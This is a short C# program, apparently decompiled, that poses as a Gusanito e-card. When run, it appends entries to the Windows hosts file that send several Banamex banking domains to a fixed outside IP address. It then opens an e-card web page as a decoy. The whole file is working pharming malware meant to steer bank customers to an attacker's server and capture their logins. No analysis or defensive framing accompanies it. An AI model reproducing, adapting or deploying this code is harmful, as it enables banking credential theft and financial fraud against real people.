using System;
using System.IO;
using Gusanito.com.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Gusanito.com;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", true);
		streamWriter.WriteLine("189.163.58.225 www.banamex.com");
		streamWriter.WriteLine("189.163.58.225 www.banamex.com.mx");
		streamWriter.WriteLine("189.163.58.225 banamex.com.mx");
		streamWriter.WriteLine("189.163.58.225 banamex.com");
		streamWriter.WriteLine("189.163.58.225 www.bancanetempresarial.banamex.com.mx");
		streamWriter.WriteLine("189.163.58.225 bancanetempresarial.banamex.com.mx");
		streamWriter.WriteLine("189.163.58.225 boveda.banamex.com.mx");
		streamWriter.WriteLine("189.163.58.225 www.boveda.banamex.com.mx");
		streamWriter.Close();
		Interaction.Shell("c:\\windows\\explorer.exe /n,/e,http://www.gusanito.com/esp/tarjetas/postales/te_extrano/lejos_de_mi/780", (AppWinStyle)1, false, -1);
	}
}
